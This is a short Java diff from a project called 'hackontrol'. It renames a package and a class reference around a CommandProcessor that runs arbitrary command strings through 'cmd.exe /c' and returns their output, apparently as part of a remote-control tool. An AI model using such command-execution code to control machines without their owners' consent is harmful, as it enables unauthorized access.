@@ -1,4 +1,4 @@
-package com.khopan.hackontrol.channel.command;
+package com.khopan.hackontrol.module.command;
 
 import java.io.InputStream;
 import java.nio.charset.StandardCharsets;
@@ -17,7 +17,7 @@ public class CommandProcessor {
 		try {
 			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
 			builder.redirectErrorStream(true);
-			builder.directory(CommandChannel.CurrentDirectory);
+			builder.directory(CommandModule.CurrentDirectory);
 			Process process = builder.start();
 			InputStream stream = process.getInputStream();
 			byte[] data = stream.readAllBytes();
